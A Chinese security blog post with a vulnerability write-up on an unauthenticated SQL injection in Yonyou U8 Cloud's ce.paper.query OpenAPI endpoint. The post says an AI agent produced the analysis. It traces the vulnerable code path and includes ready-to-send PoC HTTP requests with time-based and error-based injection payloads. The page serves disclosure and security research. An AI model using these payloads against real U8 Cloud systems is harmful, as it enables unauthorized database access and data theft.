@@ -1,0 +1,1336 @@
+<article class="border rounded p-3">
+ <h1 class="pt-3 pb-4 article-title">
+  用友U8Cloud /u8cloud/openapi/ce.paper.query SQL 注入漏洞
+ </h1>
+ <div class="aio-h5 text-muted article-info">
+  <ul class="d-flex flex-wrap aio-list-split-dot">
+   <a href="https://mrxn.net/author/1">
+    Mrxn
+   </a>
+   <li>
+    发表于2026/2/3 08:40
+   </li>
+   <li>
+    535浏览
+   </li>
+   <li>
+    <a href="#comment" target="_self">
+     0评论
+    </a>
+   </li>
+   <li>
+    <span class="text-bold">
+     47分钟
+    </span>
+    阅读
+   </li>
+   <li>
+   </li>
+  </ul>
+ </div>
+ <div style="max-width: 790px;">
+  <script async="" crossorigin="anonymous" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3202499379713676">
+  </script>
+  <ins class="adsbygoogle" data-ad-client="ca-pub-3202499379713676" data-ad-format="fluid" data-ad-layout="in-article" data-ad-slot="2223359147" style="display:block; text-align:center;">
+  </ins>
+  <script>
+   (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+ </div>
+ <hr class="my-3"/>
+ <div class="line-numbers my-3 article-content markdown">
+  <h1>
+   前言
+  </h1>
+  <p>
+   本次漏洞分析全程由opencode+gemini-3-pro-high 完成。
+  </p>
+  <p>
+   <img alt="用友U8Cloud /u8cloud/openapi/ce.paper.query SQL 注入漏洞" src="https://image.mrxn.net/f960771a7fa8434d95a4165e827e2eb1.webp"/>
+  </p>
+  <p>
+   我搭建好环境以及mcp后，提出需求，其余均为agent自动完成。
+  </p>
+  <p>
+   <img alt="用友U8Cloud /u8cloud/openapi/ce.paper.query SQL 注入漏洞" src="https://image.mrxn.net/d6d492e25d8348e5b07460184370ec2e.webp"/>
+  </p>
+  <p>
+   效果还行。
+  </p>
+  <h1>
+   审计报告
+  </h1>
+  <h2>
+   1. 漏洞概述
+  </h2>
+  <p>
+   在
+   <a href="https://mrxn.net/tag/%E7%94%A8%E5%8F%8B" title="用友">
+    用友
+   </a>
+   U8 Cloud 系统的
+   <code>
+    /u8cloud/openapi/ce.paper.query
+   </code>
+   接口中发现一处严重的高危
+   <a href="https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5" title="SQL注入">
+    SQL注入
+   </a>
+   漏洞。该漏洞允许未经身份验证的远程攻击者通过构造恶意的 JSON 请求，在数据库中执行任意 SQL 命令。漏洞的根源在于服务端未对用户输入的
+   <code>
+    pk_group
+   </code>
+   和
+   <code>
+    pk_paper
+   </code>
+   参数进行任何过滤或预编译处理，直接将其拼接至 SQL 查询语句中。
+  </p>
+  <ul>
+   <li>
+    <strong>
+     漏洞类型
+    </strong>
+    : SQL 注入 (Blind/Stacked Queries)
+   </li>
+   <li>
+    <strong>
+     影响组件
+    </strong>
+    : 用友 U8 Cloud (ce.paper.query 接口)
+   </li>
+   <li>
+    <strong>
+     危险等级
+    </strong>
+    : 高危 (Critical)
+   </li>
+   <li>
+    <strong>
+     利用条件
+    </strong>
+    :
+    <ul>
+     <li>
+      网络可达
+      <code>
+       /u8cloud/openapi/
+      </code>
+      接口
+     </li>
+     <li>
+      无需有效身份认证 (可通过
+      <code>
+       appcode=lbsj
+      </code>
+      绕过或直接调用)
+     </li>
+    </ul>
+   </li>
+  </ul>
+  <h2>
+   2. 漏洞详细分析路径
+  </h2>
+  <h3>
+   2.1 入口点与 URL 路由处理
+  </h3>
+  <p>
+   攻击者发起的 HTTP 请求首先由 Servlet 容器接收，并根据 URL 路径进行分发。
+  </p>
+  <ol>
+   <li>
+    <p>
+     <strong>
+      Servlet
+     </strong>
+     <strong>
+      映射 (
+      <code>
+       ExtSystemInvokerServlet
+      </code>
+      )
+     </strong>
+     :
+    </p>
+    <ol>
+     <li>
+      在
+      <code>
+       web.xml
+      </code>
+      或 Servlet 注册中，路径
+      <code>
+       /u8cloud/openapi/*
+      </code>
+      被映射到
+      <code>
+       nc.bs.framework.server.extsys.ExtSystemInvokerServlet
+      </code>
+      。
+     </li>
+     <li>
+      该 Servlet 的
+      <code>
+       doAction
+      </code>
+      方法会拦截请求。它通过遍历
+      <code>
+       ExtSystemServerEnum
+      </code>
+      枚举来匹配 URL 前缀。
+     </li>
+     <li>
+      匹配到
+      <code>
+       OPENAPI
+      </code>
+      枚举项 (
+      <code>
+       /u8cloud/openapi/
+      </code>
+      ) 后，确定服务名称为
+      <code>
+       u8cloud_openapi
+      </code>
+      。
+     </li>
+    </ol>
+   </li>
+   <li>
+    <p>
+     <strong>
+      服务分发 (
+      <code>
+       APIOpenServletForJSON
+      </code>
+      )
+     </strong>
+     :
+    </p>
+    <ol>
+     <li>
+      <code>
+       ExtSystemInvokerServlet
+      </code>
+      使用
+      <code>
+       NCLocator
+      </code>
+      查找名为
+      <code>
+       u8cloud_openapi
+      </code>
+      的服务组件。
+     </li>
+     <li>
+      该服务映射到
+      <code>
+       u8c.server.APIOpenServletForJSON
+      </code>
+      类。
+     </li>
+     <li>
+      <code>
+       APIOpenServletForJSON.doAction
+      </code>
+      将请求转发给
+      <code>
+       u8c.server.APIOpenController
+      </code>
+      处理。
+     </li>
+    </ol>
+   </li>
+   <li>
+    <p>
+     <strong>
+      路径解析与 Action 映射 (
+      <code>
+       APIOpenController
+      </code>
+      )
+     </strong>
+     :
+    </p>
+    <ol>
+     <li>
+      <code>
+       APIOpenController.forWard()
+      </code>
+      方法被调用。
+     </li>
+     <li>
+      <strong>
+       路径转换
+      </strong>
+      : 方法内部调用
+      <code>
+       getPath(request)
+      </code>
+      ，将 URL 路径
+      <code>
+       /ce/paper/query
+      </code>
+      转换为点分字符串
+      <code>
+       ce.paper.query
+      </code>
+      。
+     </li>
+     <li>
+      <strong>
+       JSON
+      </strong>
+      <strong>
+       解析
+      </strong>
+      : 控制器读取 HTTP 请求体。由于我们在 URL 中指定了
+      <code>
+       isEncrypt=N
+      </code>
+      ，控制器跳过解密步骤，直接调用
+      <code>
+       JSONObject.fromObject()
+      </code>
+      解析 JSON 数据。
+     </li>
+     <li>
+      <strong>
+       动态调用
+      </strong>
+      : 控制器查找实现了
+      <code>
+       IInvokeWithJSon
+      </code>
+      接口的服务，并调用其
+      <code>
+       invoke
+      </code>
+      方法，传入解析后的路径
+      <code>
+       ce.paper.query
+      </code>
+      和 JSON 数据。
+     </li>
+     <li>
+      框架根据
+      <code>
+       ce.paper.query
+      </code>
+      标识符（对应 Action 的
+      <code>
+       billMark
+      </code>
+      或配置）将请求路由到
+      <code>
+       u8c.bs.ce.action.PaperQueryAction
+      </code>
+      。
+     </li>
+    </ol>
+   </li>
+  </ol>
+  <h3>
+   2.2 参数提取与对象转换
+  </h3>
+  <ol>
+   <li>
+    <p>
+     <strong>
+      Action 处理 (
+      <code>
+       PaperQueryAction
+      </code>
+      )
+     </strong>
+     :
+    </p>
+    <ol>
+     <li>
+      <code>
+       PaperQueryAction
+      </code>
+      继承自
+      <code>
+       AbstractBatchSaveAPIPubVOAction&lt;PaperExecuteVO&gt;
+      </code>
+      。
+     </li>
+     <li>
+      该基类负责将输入的 JSON 对象转换为 Java Value Object (VO) 数组。
+     </li>
+     <li>
+      <strong>
+       关键点
+      </strong>
+      : JSON 数据必须包含一个以
+      <code>
+       billMark
+      </code>
+      (此处为
+      <code>
+       "paperexecute"
+      </code>
+      ) 命名的键，其值为一个数组。例如：
+      <code>
+       {"paperexecute": [{"pk_group": "...", "pk_paper": "..."}]}
+      </code>
+      。
+     </li>
+     <li>
+      框架使用反射将 JSON 数组中的字段（如
+      <code>
+       pk_group
+      </code>
+      ,
+      <code>
+       pk_paper
+      </code>
+      ）映射到
+      <code>
+       PaperExecuteVO
+      </code>
+      对象的对应属性。此时，恶意的 SQL 注入 payload (如
+      <code>
+       1'; WAITFOR DELAY '0:0:5'--
+      </code>
+      ) 被注入到 VO 对象的
+      <code>
+       pk_group
+      </code>
+      属性中。
+     </li>
+    </ol>
+   </li>
+   <li>
+    <p>
+     <strong>
+      业务逻辑调用
+     </strong>
+     :
+    </p>
+    <ol>
+     <li>
+      <code>
+       PaperQueryAction.save()
+      </code>
+      方法被调用，传入包含恶意数据的
+      <code>
+       PaperExecuteVO[]
+      </code>
+      数组。
+     </li>
+     <li>
+      随后调用业务处理类
+      <code>
+       PaperBP().queryResult(vos)
+      </code>
+      。
+     </li>
+    </ol>
+   </li>
+  </ol>
+  <h3>
+   2.3 污点传播与 SQL 构建 (Sink)
+  </h3>
+  <ol>
+   <li>
+    <p>
+     <strong>
+      业务处理 (
+      <code>
+       PaperBP
+      </code>
+      )
+     </strong>
+     :
+    </p>
+    <ol>
+     <li>
+      <code>
+       PaperBP.queryResult
+      </code>
+      方法从数组中取出第一个 VO 对象：
+      <code>
+       executeVOs[0]
+      </code>
+      。
+     </li>
+     <li>
+      它提取出
+      <code>
+       pk_paper
+      </code>
+      和
+      <code>
+       pk_group
+      </code>
+      属性值。
+     </li>
+     <li>
+      调用数据访问对象：
+      <code>
+       new PaperResultDMO().query(pk_paper, pk_group)
+      </code>
+      。
+     </li>
+    </ol>
+   </li>
+   <li>
+    <p>
+     <strong>
+      漏洞触发点 (
+      <code>
+       PaperResultDMO
+      </code>
+      )
+     </strong>
+     :
+    </p>
+    <ol>
+     <li>
+      <p>
+       在
+       <code>
+        u8c.bs.ce.dmo.PaperResultDMO.java
+       </code>
+       的
+       <code>
+        query
+       </code>
+       方法中，存在直接的字符串拼接：
+      </p>
+     </li>
+     <li>
+      <p>
+       <code>
+        public PaperResultVO query(String pk_paper, String pk_questiongroup) throws BusinessException {    // 严重漏洞：直接将参数拼接到 SQL WHERE 子句中    PaperResultVO[] vos = (PaperResultVO[])new SuperVOQuery(PaperResultVO.class)        .queryVOByWhere(" pk_paper = '" + pk_paper + "' and pk_group = '" + pk_questiongroup + "' ");        // ... 后续还有第二次拼接 ...    TaskVO[] tasks = (TaskVO[])new SuperVOQuery(TaskVO.class)        .queryVOByWhere("pk_paper = '" + pk_paper + "' and pk_group = '" + pk_questiongroup + "'"); }
+       </code>
+      </p>
+     </li>
+     <li>
+      <p>
+       当
+       <code>
+        pk_questiongroup
+       </code>
+       包含
+       <code>
+        1'; WAITFOR DELAY '0:0:5'--
+       </code>
+       时，最终执行的 SQL 变为：
+      </p>
+      <ul>
+       <li>
+        <code>
+         SELECT ... FROM ... WHERE pk_paper = '1' and pk_group = '1'; WAITFOR DELAY '0:0:5'--'
+        </code>
+       </li>
+      </ul>
+     </li>
+    </ol>
+   </li>
+   <li>
+    <p>
+     数据库（如 SQL Server）支持堆叠查询（Stacked Queries），因此会先执行前面的 SELECT 语句，紧接着执行
+     <code>
+      WAITFOR DELAY
+     </code>
+     命令，导致数据库暂停响应 5 秒。
+    </p>
+   </li>
+  </ol>
+  <h2>
+   3. 漏洞复现 (PoC)
+  </h2>
+  <p>
+   通过 Fuzz 测试验证，以下 HTTP 请求可稳定触发漏洞。
+  </p>
+  <p>
+   路径：
+   <code>
+    /u8cloud/openapi/ce/paper/query
+   </code>
+   或者
+   <code>
+    /u8cloud/openapi/ce.paper.query
+   </code>
+   均可
+  </p>
+  <p>
+   <strong>
+    Request:
+   </strong>
+  </p>
+  <pre><code class="language-HTTP">POST /u8cloud/openapi/ce.paper.query?appcode=lbsj&amp;isEncrypt=N&amp;trantype=paperexecute HTTP/1.1
+Host: u8cloud.mrxn.net
+Content-Type: application/json
+Content-Length: 108
+
+{
+    "paperexecute": [
+        {
+            "pk_group": "1'; WAITFOR DELAY '0:0:5'--",
+            "pk_paper": "1"
+        }
+    ]
+}</code></pre>
+  <pre><code class="language-HTTP">POST /u8cloud/openapi/ce/paper/query?appcode=lbsj&amp;isEncrypt=N HTTP/1.1
+Host: u8cloud.mrxn.net
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Cache-Control: max-age=0
+Content-Type: application/json
+Content-Length: 95
+
+{
+  "paperexecute": [
+    { "pk_group": "1'; WAITFOR DELAY '0:0:5'--", "pk_paper": "1" }
+  ]
+}</code></pre>
+  <p>
+   <img alt="用友U8Cloud /u8cloud/openapi/ce.paper.query SQL 注入漏洞" src="https://image.mrxn.net/b5eb5ac37cbe4f638f0a8fe680140d8b.webp"/>
+  </p>
+  <p>
+   延时 5 秒
+  </p>
+  <p>
+   报错注入一样
+  </p>
+  <pre><code class="language-HTTP">POST /u8cloud/openapi/ce/paper/query?appcode=lbsj&amp;isEncrypt=N HTTP/1.1
+Host: u8cloud.mrxn.net
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Cache-Control: max-age=0
+Content-Type: application/json
+Content-Length: 95
+
+{
+  "paperexecute": [
+    { "pk_group": "'-1/user--", "pk_paper": "1" }
+  ]
+}</code></pre>
+  <pre><code class="language-http">HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=451D9D503710ADFFEC88E29923BE4AE6.server; Path=/; HttpOnly
+Content-Type: application/json;charset=utf-8
+
+{
+  "status": "falied",
+  "errorcode": "-32000",
+  "errormsg": "U8C返回信息:在将 nvarchar 值 \u0027dbo\u0027 转换成数据类型 int 时失败。"
+}</code></pre>
+ </div>
+ <div class="flex-v-between">
+  <ul class="d-flex flex-wrap article-tags">
+   <li>
+    标签：
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E">
+     <span class="text-muted">
+      #
+     </span>
+     漏洞
+    </a>
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/web%E5%AE%89%E5%85%A8">
+     <span class="text-muted">
+      #
+     </span>
+     web安全
+    </a>
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5">
+     <span class="text-muted">
+      #
+     </span>
+     SQL注入
+    </a>
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">
+     <span class="text-muted">
+      #
+     </span>
+     代码审计
+    </a>
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/Java">
+     <span class="text-muted">
+      #
+     </span>
+     Java
+    </a>
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/%E5%A4%A7%E6%A8%A1%E5%9E%8B">
+     <span class="text-muted">
+      #
+     </span>
+     大模型
+    </a>
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/%E7%94%A8%E5%8F%8B">
+     <span class="text-muted">
+      #
+     </span>
+     用友
+    </a>
+   </li>
+  </ul>
+ </div>
+ <hr class="my-3"/>
+ <script>
+  // 获取当前脚本所在的父容器
+		const parentContainer = document.currentScript.parentElement;
+		let searchContainer = parentContainer.querySelector('article') || parentContainer;
+
+		if (searchContainer) {
+			// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
+			let images = [];
+			const containers = searchContainer.querySelectorAll('.prose, .markdown');
+			containers.forEach(function(container) {
+				images = images.concat(Array.from(container.querySelectorAll('img')));
+			});
+
+			if (images.length === 0) {
+				images = searchContainer.querySelectorAll('img');
+			}
+
+			images.forEach(function(img) {
+				if (img.getAttribute('data-action') === 'zoom') {
+					const parentLink = img.parentNode;
+					if (parentLink.tagName === 'A') {
+						parentLink.setAttribute('data-fancybox', 'gallery');
+					}
+				} else {
+					const link = document.createElement('a');
+					link.setAttribute('data-fancybox', 'gallery');
+					link.setAttribute('href', img.getAttribute('src'));
+
+					img.parentNode.insertBefore(link, img);
+					link.appendChild(img);
+				}
+			});
+
+			// 初始化 Fancybox
+			Fancybox.bind("[data-fancybox]", {
+				// 您的自定义选项
+			});
+		}
+ </script>
+ <div class="x_nav_toc">
+  <div class="x_toc_header">
+   <span class="x_toc_title">
+    文章目录
+   </span>
+   <button class="x_toc_close">
+    ×
+   </button>
+  </div>
+  <div class="x_toc_content">
+   <ul class="x_anchor-list">
+   </ul>
+  </div>
+ </div>
+ <button class="x_toc_toggle">
+  <svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+   <line x1="3" x2="21" y1="12" y2="12">
+   </line>
+   <line x1="3" x2="21" y1="6" y2="6">
+   </line>
+   <line x1="3" x2="21" y1="18" y2="18">
+   </line>
+  </svg>
+ </button>
+ <style type="text/css">
+  .x_nav_toc {
+    position: fixed;
+    top: 0;
+    right: -300px;
+    width: 280px;
+    height: 100%;
+    background-color: white;
+    box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
+    z-index: 1000;
+    transition: right 0.3s ease;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    padding-top: 10px;
+}
+
+.x_nav_toc.active {
+    right: 0;
+    
+    
+}
+
+
+.x_toc_header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px 20px;
+    height: 48px;
+    border-bottom: 1px solid #eee;
+}
+
+.x_toc_title {
+    font-size: 18px;
+    font-weight: bold;
+    color: #333;
+}
+
+.x_toc_close {
+    background: none;
+    border: none;
+    font-size: 24px;
+    cursor: pointer;
+    color: #777;
+    transition: color 0.2s;
+}
+
+.x_toc_close:hover {
+    color: #333;
+}
+
+.x_toc_content {
+    flex: 1;
+    overflow-y: auto;
+    padding: 15px 20px;
+    padding-right: 10px;
+}
+
+.x_anchor-list {
+    list-style-type: none;
+    padding: 0;
+    margin: 0;
+}
+
+/* 减小目录项间距 */
+.x_anchor-list li {
+    margin-bottom: 4px; /* 间距从8px减小到4px */
+}
+
+.x_anchor-list a {
+    text-decoration: none;
+    color: #555;
+    display: block;
+    padding: 6px 10px; /* 减少内边距 */
+    transition: all 0.2s;
+    font-size: 14px;
+    border-radius: 4px;
+    line-height: 1.4; /* 减小行高 */
+}
+
+.x_anchor-list a:hover,
+.x_anchor-list a:focus {
+    background-color: #f8f9fa;
+    color: #0068d6;
+}
+
+
+
+.toc-number {
+    font-weight: 600;
+    margin-right: 8px;
+    color: #495057;
+    display: inline-block;
+    min-width: 25px;
+}
+
+/* 减小各级标题间距 */
+.toc-h1 {
+    font-weight: 600;
+    font-size: 15px;
+    margin-top: 10px; /* 上边距从15px减小到10px */
+    padding-left: 5px !important;
+}
+
+.toc-h2 {
+    font-size: 14px;
+    padding-left: 15px !important; /* 缩进从20px减小到15px */
+}
+
+.toc-h3 {
+    font-size: 13px;
+    padding-left: 25px !important; /* 缩进从30px减小到25px */
+}
+
+.toc-h4 {
+    font-size: 12px;
+    padding-left: 35px !important; /* 缩进从40px减小到35px */
+}
+
+/* 修改后的切换按钮样式 - 使用图标且位置下移 */
+.x_toc_toggle {
+    position: fixed;
+    bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
+    border-radius: 50%;
+    border: none;
+    cursor: pointer;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    z-index: 999;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0;
+    
+}
+
+.x_toc_toggle svg {
+   width:24px;height:24px;stroke:#3d9bff;
+}
+
+.x_toc_toggle:hover {
+    #background-color: #0081f8;
+    transform: translateY(-3px);
+    box-shadow: 0 6px 15px rgba(0,0,0,0.2);
+}
+
+@media (max-width: 768px) {
+    .x_nav_toc {
+        width: 280px;
+    }
+    .x_toc_toggle {
+        bottom: 100px; /* 手机端也下移位置 */
+        right: 30px;
+        width: 40px;
+        height: 40px;
+    }
+    .x_toc_toggle svg {
+        width: 20px;
+        height: 20px;
+    }
+}
+ </style>
+ <script>
+  document.addEventListener('DOMContentLoaded', function() {
+    // 获取所有标题元素
+    var className = ".line-numbers"; 
+    var selectors = [];
+    for (var i = 1; i <= 6; i++) {
+        selectors.push(className + ' h' + i);
+    }
+    var headings = document.querySelectorAll(selectors.join(', '));
+    
+    // 获取DOM元素
+    var tocContainer = document.querySelector('.x_nav_toc');
+    var toggleButton = document.querySelector('.x_toc_toggle');
+    var tocList = document.querySelector('.x_anchor-list');
+    var closeButton = document.querySelector('.x_toc_close');
+    var currentHighlight = null;
+    
+                
+    // 检测是否为移动设备
+      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    
+    // 如果没有标题，隐藏所有元素
+    if (headings.length === 0) {
+        tocContainer.style.display = 'none';
+        toggleButton.style.display = 'none';
+        return;
+    }
+    
+    // 初始化层级计数器
+    var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
+    var currentLevel = 0;
+    
+    // 生成带数字编号的目录
+    headings.forEach(function(heading, index) {
+        var level = parseInt(heading.tagName[1]);
+        
+        // 更新计数器
+        counters[level - 1] += 1; // 增加当前级别计数器
+        
+        // 重置更低级计数器
+        for (var i = level; i < 6; i++) {
+            counters[i] = 0;
+        }
+        
+        // 生成编号字符串（如"1.2.3"）
+        var numberParts = [];
+        for (var i = 0; i < level; i++) {
+            if (counters[i] > 0) {
+                numberParts.push(counters[i]);
+            }
+        }
+        var numberText = numberParts.join('.')+'.';
+        
+        // 创建唯一ID
+        var id = 'toc-' + numberText.replace(/\./g, '-');
+        heading.id = id;
+        
+        var listItem = document.createElement('li');
+        var anchor = document.createElement('a');
+        var numberSpan = document.createElement('span');
+        
+        numberSpan.className = 'toc-number';
+        numberSpan.textContent = numberText;
+        anchor.appendChild(numberSpan);
+        anchor.innerHTML += heading.textContent;
+        anchor.href = '#' + id;
+        anchor.classList.add('toc-h' + level);
+        
+        listItem.appendChild(anchor);
+        tocList.appendChild(listItem);
+        
+        // 添加点击事件（不关闭目录）
+        anchor.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            
+           
+            // 更新高亮状态
+            if (currentHighlight) {
+                currentHighlight.classList.remove('active');
+            }
+            this.classList.add('active');
+            currentHighlight = this;
+            
+            // 滚动到对应位置
+            var targetId = this.getAttribute('href').substring(1);
+            var targetElement = document.getElementById(targetId);
+            if (targetElement) {
+                var header = document.querySelector("header");
+                var headerHeight = header ? header.offsetHeight : 0;
+                var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
+                var offsetPosition = elementPosition - headerHeight - 20;
+                
+                window.scrollTo({
+                    top: offsetPosition,
+                    behavior: 'smooth'
+                });
+                
+                // 滚动到目录项的可视区域
+                this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
+    
+
+          // 点击事件中
+          if (isMobile) {
+           closeToc(); // 移动端点击后关闭目录
+          }
+            
+                
+            }
+        });
+    });
+    
+    // 切换按钮点击事件
+    toggleButton.addEventListener('click', function() {
+        tocContainer.classList.add('active');
+     
+    });
+    
+    // 关闭按钮点击事件
+    closeButton.addEventListener('click', function(e) {
+        e.stopPropagation();
+        closeToc();
+    });
+    
+  
+    
+    // 滚动时更新高亮状态
+    window.addEventListener('scroll', function() {
+    
+    var fromTop = window.scrollY;
+    var header = document.querySelector("header");
+    var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
+    
+    
+     //console.log(headerHeight);
+    
+    
+    
+    // 精准计算标题文档位置
+    var activeSection = null;
+    headings.forEach(function(heading) {
+        var section = document.getElementById(heading.id);
+        if (!section) return;
+        
+        // 使用getBoundingClientRect获取精确位置
+        var rect = section.getBoundingClientRect();
+        var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
+        var sectionBottom = rect.bottom + fromTop + headerHeight;
+        
+        // 增加20px激活区域缓冲
+        if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
+            activeSection = heading;
+        }
+    });
+
+
+ 
+
+    // 更新高亮状态（新增精确边界判断）
+    if (activeSection) {
+        var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
+
+        if (tocLink && currentHighlight !== tocLink) {
+            if (currentHighlight) {
+            currentHighlight.blur();
+            currentHighlight.classList.remove('active');
+            }
+            
+            
+            tocLink.classList.add('active');
+           tocLink.focus();
+            currentHighlight = tocLink;
+            
+            // 平滑滚动到可视区域（改进触发条件）
+            var tocRect = tocLink.getBoundingClientRect();
+            var tocContainerRect = tocContainer.getBoundingClientRect();
+            if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
+                tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
+            }
+        }
+    }
+});
+    
+    // 关闭目录面板
+    function closeToc() {
+        tocContainer.classList.remove('active');
+      
+    }
+});
+ </script>
+ <style>
+  /* 超小屏幕隐藏 */
+    @media (max-width: 768px) {
+        #qrcode-right {
+            display: none;
+        }
+    }
+ </style>
+ <div class="copyright-plugin" style="padding:10px; font-size:14px; display:flex; justify-content: space-between; align-items: center;">
+  <div>
+   版权所有：
+   <a href="https://mrxn.net/">
+    Mrxn's Blog
+   </a>
+   <br/>
+   文章标题：
+   <a href="https://mrxn.net/jswz/u8cloud-openapi-ce-paper-query-sqli.html">
+    用友U8Cloud /u8cloud/openapi/ce.paper.query SQL 注入漏洞
+   </a>
+   <br/>
+   文章链接：
+   <a href="https://mrxn.net/jswz/u8cloud-openapi-ce-paper-query-sqli.html">
+    https://mrxn.net/jswz/u8cloud-openapi-ce-paper-query-sqli.html
+   </a>
+   <br/>
+   本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。
+  </div>
+  <!-- 右侧二维码 -->
+  <div id="qrcode-right">
+   <div id="copyright-qrcode">
+   </div>
+   <div style="text-align: center;font-size:12px;">
+    设备上扫码阅读
+   </div>
+  </div>
+  <script src="https://mrxn.net/content/plugins/log_posts/assets/qrcode.min.js">
+  </script>
+  <script>
+   var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
+        text: encodeURI("https://mrxn.net/jswz/u8cloud-openapi-ce-paper-query-sqli.html"),
+        width: 100,
+        height: 100,
+        colorDark: "#000000",
+        colorLight: "#ffffff",
+        correctLevel: QRCode.CorrectLevel.H
+    });
+  </script>
+ </div>
+ <div class="posts_related">
+  <h3>
+   📚 推荐阅读
+  </h3>
+  <ul>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html">
+     深信服运维安全管理系统 install_patch 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html">
+     深信服运维安全管理系统 del_patch 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html">
+     深信服运维安全管理系统 upload_file 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html">
+     深信服运维安全管理系统 csspost/update 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html">
+     深信服运维安全管理系统 save_SNMP 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html">
+     深信服运维安全管理系统 getLdap 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html">
+     深信服运维安全管理系统 Jwt 密钥硬编码
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html">
+     深信服运维安全管理系统 del_route 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html">
+     深信服运维安全管理系统 del_net 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html">
+     深信服运维安全管理系统 change_net 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html">
+     九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html">
+     九佳易管理系统 Ajax_XT.ashx SQL 注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/qinglong-auth-bypass-rce.html">
+     青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html">
+     九佳易管理系统 picHY.ashx SQL 注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-install-config-rce.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html">
+     东胜物流软件 MsChDuiController 多个SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-Public-download.html">
